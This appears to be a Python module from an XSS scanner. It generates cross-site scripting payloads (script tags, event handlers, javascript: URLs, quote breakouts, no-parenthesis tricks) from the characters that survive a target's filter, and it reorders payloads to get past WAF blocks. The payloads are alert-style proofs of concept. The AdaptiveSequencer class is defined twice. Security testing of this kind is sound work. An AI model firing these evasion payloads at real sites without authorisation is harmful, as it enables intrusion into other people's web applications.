"""
payloads/smart_generator.py

SmartGenerator — CharacterMatrix-aware payload generator.

This is the revolutionary part:
Instead of "spray and pray" with 500 payloads,
SmartGenerator KNOWS which characters survive the filter
and builds payloads GUARANTEED to only use surviving chars.

Pipeline:
  1. Receive CharacterMatrix from FilterProbe
  2. Build payload templates using only surviving chars
  3. Fill templates with context-appropriate execution methods
  4. Score each payload (SmartPayloadFilter)
  5. Return ranked list — highest probability first
"""

import base64
import random
import re
from typing import List, Tuple, Optional

from utils.config import Context
from scanner.filter_probe import CharacterMatrix, SmartPayloadFilter


# ─── Execution method registry ───────────────────────────────────────────────

# Each method: (template, required_labels, description)
EXEC_METHODS = [
    # Direct alert variants
    ("alert(1)",          ["paren_open", "paren_close", "alert_keyword"], "direct_call"),
    ("alert`1`",          ["backtick",   "alert_keyword"],                "template_literal"),
    ("confirm(1)",        ["paren_open", "paren_close"],                  "confirm_call"),
    ("prompt(1)",         ["paren_open", "paren_close"],                  "prompt_call"),
    # Obfuscated
    ("(0,alert)(1)",      ["paren_open", "paren_close"],                  "comma_operator"),
    ("window.alert(1)",   ["paren_open", "paren_close"],                  "window_dot"),
    ("[1].find(alert)",   ["paren_open", "paren_close"],                  "array_find"),
    # String split obfuscation
    ("window['al'+'ert'](1)", ["paren_open", "single_quote"],            "str_concat"),
    # No-paren variants (for when parens are filtered)
    ("throw onerror=alert,1",  ["alert_keyword"],                         "throw_trick"),
    ("{onerror=alert}throw 1", ["alert_keyword"],                         "block_throw"),
]

# Payload blueprints per context × exec method × char survival
BLUEPRINTS = {
    Context.HTML: [
        # tag_open required
        ("<{tag} {event}={exec}>",          ["tag_open", "tag_close", "event_handler"]),
        ("<{tag}/{event}={exec}>",           ["tag_open", "tag_close", "event_handler"]),
        ("<{tag} src=x {event}={exec}>",     ["tag_open", "tag_close", "event_handler"]),
        ("<script>{exec}</script>",          ["tag_open", "tag_close", "script_keyword"]),
        ("<{tag} onload={exec}>",            ["tag_open", "tag_close", "onload"]),
        # No angle bracket fallbacks
        ("javascript:{exec}",               ["js_proto"]),
    ],
    Context.ATTRIBUTE: [
        ("\"{event}={exec} a=\"",            ["double_quote", "event_handler"]),
        ("'{event}={exec} a='",             ["single_quote",  "event_handler"]),
        ("\"><{tag} {event}={exec}>",        ["double_quote", "tag_open", "event_handler"]),
        ("'><{tag} {event}={exec}>",         ["single_quote", "tag_open", "event_handler"]),
        ("\" autofocus {event}={exec} \"",   ["double_quote", "event_handler"]),
        ("javascript:{exec}",               ["js_proto"]),
    ],
    Context.JS: [
        (";{exec}//",                        ["semicolon"]),
        ("';{exec}//",                       ["single_quote", "semicolon"]),
        ("\";{exec}//",                      ["double_quote", "semicolon"]),
        ("</script><script>{exec}</script>", ["tag_open", "script_keyword"]),
        ("\n{exec}\n",                       []),
        ("\\';{exec}//",                     ["backslash", "single_quote"]),
    ],
    Context.JS_STRING: [
        ("';{exec}//",                       ["single_quote", "semicolon"]),
        ("'+{exec}+'",                       ["single_quote"]),
        ("\";{exec}//",                      ["double_quote", "semicolon"]),
        ("\"+{exec}+\"",                     ["double_quote"]),
    ],
    Context.JS_TEMPLATE: [
        ("${{{exec}}}",                      ["backtick"]),
        ("`+{exec}+`",                       ["backtick"]),
    ],
    Context.URL: [
        ("javascript:{exec}",               ["js_proto"]),
        ("data:text/html,<script>{exec}</script>", ["tag_open", "script_keyword"]),
    ],
}

# Tags and events that work in HTML context
INJECTABLE_TAGS = ["img", "svg", "video", "audio", "details", "marquee", "input", "iframe"]
INJECTABLE_EVENTS = ["onerror", "onload", "onfocus", "ontoggle", "onstart", "onmouseover"]


class SmartGenerator:
    """
    CharacterMatrix-aware payload generator.

    For each context:
    1. Pick blueprints whose required chars all survive
    2. Fill blueprint with best available execution method
    3. Score against matrix → sort descending
    4. Return top N payloads with 100% survival guarantee
    """

    def __init__(self, max_payloads: int = 50):
        self.max     = max_payloads
        self._filter = SmartPayloadFilter()

    def generate(
        self,
        matrix: CharacterMatrix,
        context: str,
        include_fallbacks: bool = True,
    ) -> List[Tuple[str, str, float]]:
        """
        Returns list of (payload, method_label, score) sorted by score desc.
        All returned payloads only use characters confirmed to survive.
        """
        results = []

        blueprints = BLUEPRINTS.get(context, BLUEPRINTS[Context.HTML])
        # Also include UNKNOWN / polyglot blueprints
        if context == Context.UNKNOWN:
            blueprints = []
            for ctx_bps in BLUEPRINTS.values():
                blueprints.extend(ctx_bps)

        for template, required_labels in blueprints:
            # Check if all required chars survived
            if not all(matrix.can_use(r) for r in required_labels):
                continue

            # Fill template with each viable exec method
            for exec_str, exec_required, exec_label in EXEC_METHODS:
                # Check exec method requirements too
                if not all(matrix.can_use(r) for r in exec_required):
                    continue

                filled = self._fill_template(template, exec_str, context)
                if filled:
                    score = self._filter._score_payload(filled, matrix)
                    if score > 0:
                        results.append((filled, exec_label, score))

        # Deduplicate
        seen = set()
        unique = []
        for payload, label, score in results:
            if payload not in seen:
                seen.add(payload)
                unique.append((payload, label, score))

        # Sort by score descending
        unique.sort(key=lambda x: x[2], reverse=True)

        # Optionally add fallback payloads (encoding-based, for chars that are encoded not stripped)
        if include_fallbacks:
            fallbacks = self._encoded_fallbacks(matrix, context)
            unique.extend(fallbacks)

        return unique[:self.max]

    def _fill_template(self, template: str, exec_str: str, context: str) -> Optional[str]:
        """Fill a blueprint template with tag, event, and exec method."""
        tag   = random.choice(INJECTABLE_TAGS)
        event = random.choice(INJECTABLE_EVENTS)
        try:
            return template.format(tag=tag, event=event, exec=exec_str)
        except (KeyError, IndexError):
            return None

    def _encoded_fallbacks(
        self,
        matrix: CharacterMatrix,
        context: str,
    ) -> List[Tuple[str, str, float]]:
        """
        For characters that are HTML-entity-encoded (not stripped),
        generate payloads that use the encoded form deliberately.
        """
        fallbacks = []

        # If < is encoded to &lt; but still functional in JS context
        if "tag_open" in matrix.encoded:
            encoding = matrix.encoded["tag_open"]
            if "&#" in encoding or "&lt;" in encoding:
                # Try HTML entity version
                p = f"&#60;script&#62;alert(1)&#60;/script&#62;"
                fallbacks.append((p, "html_entity_fallback", 0.4))

        # If quotes are encoded, try template literals
        if "single_quote" in matrix.encoded and matrix.can_use("backtick"):
            p = "<script>alert`1`</script>"
            fallbacks.append((p, "template_literal_fallback", 0.5))

        # If parens encoded but can use throw trick
        if "paren_open" in matrix.stripped and matrix.can_use("alert_keyword"):
            p = "<script>onerror=alert;throw 1</script>"
            fallbacks.append((p, "no_paren_throw", 0.6))

        return fallbacks


# ─── Adaptive Payload Sequencer ──────────────────────────────────────────────

class AdaptiveSequencer:
    """
    Dynamically re-order and select payloads during a scan
    based on real-time feedback.

    - If a payload gets reflected → prioritize similar payloads
    - If a payload gets blocked → deprioritize that family
    - Learns within a single scan session
    """

class AdaptiveSequencer:
    """
    Dynamically re-order and select payloads during a scan
    based on real-time feedback.

    - If a payload gets reflected → prioritize similar payloads
    - If a payload gets blocked → deprioritize that family
    - Learns within a single scan session

    Family resolution order:
    1. Parse tag from structured label: "html:svg:onerror:none" → "svg"
    2. Extract from payload regex if label is unstructured
    3. Fallback to full label as family key
    """

    def __init__(self):
        self._family_scores: dict = {}   # family_key → cumulative score adj
        self._blocked_patterns: set = set()

    # ── Internal helpers ──────────────────────────────────────────────────────

    @staticmethod
    def _extract_family(label: str, payload: str) -> str:
        """
        Extract a stable family key from a label+payload pair.

        Combo engine labels look like "html:svg:onerror:none" — the tag name
        is always the 2nd colon-separated component.  For other label formats
        (mxss, blind, chain:…) we fall back to a regex on the payload itself.
        """
        parts = label.split(":")
        if len(parts) >= 2:
            tag = parts[1].strip()
            # Sanity-check: should be a real HTML tag or keyword
            if re.match(r'^[a-z][\w-]{1,20}$', tag):
                return tag

        # Fallback: extract first HTML tag name from payload
        m = re.search(r'<([a-z][\w:-]{1,20})', payload, re.IGNORECASE)
        if m:
            return m.group(1).lower()

        # Last resort: first 12 chars of label
        return label[:12]

    # ── Public API ────────────────────────────────────────────────────────────

    def feedback(self, payload: str, label: str, result):
        """
        Provide feedback on a payload result.
          result=None  → blocked/no reflection → penalise family
          result=dict  → detected              → boost family

        Penalty is aggressive on first block — WAFs block entire families.
        Boost is tag-family-wide so sibling payloads benefit immediately.
        """
        family = self._extract_family(label, payload)

        if result is None:
            current = self._family_scores.get(family, 0.0)
            # First block → heavy penalty; repeated blocks → smaller increments
            penalty = -0.6 if current >= 0 else -0.2
            self._family_scores[family] = current + penalty
            # Remember payload prefix so near-duplicates are also deprioritised
            if len(payload) > 5:
                self._blocked_patterns.add(payload[:12])
        else:
            conf = result.get("confidence", 0.5) if isinstance(result, dict) else 0.5
            # Strong boost — spread to the whole tag family
            self._family_scores[family] = (
                self._family_scores.get(family, 0.0) + conf * 2.0
            )

    def rerank(
        self,
        payloads: List[Tuple[str, str, float]],
    ) -> List[Tuple[str, str, float]]:
        """Re-rank payloads based on accumulated family feedback."""

        def adjusted_score(item):
            payload, label, base_score = item
            # Hard-filter near-duplicates of blocked payloads
            for pattern in self._blocked_patterns:
                if payload.startswith(pattern):
                    return -1.0
            family = self._extract_family(label, payload)
            return base_score + self._family_scores.get(family, 0.0)

        return sorted(payloads, key=adjusted_score, reverse=True)

    def is_blocked_family(self, label: str, payload: str) -> bool:
        """Returns True if this family has been heavily penalised."""
        family = self._extract_family(label, payload)
        return self._family_scores.get(family, 0.0) < -0.5
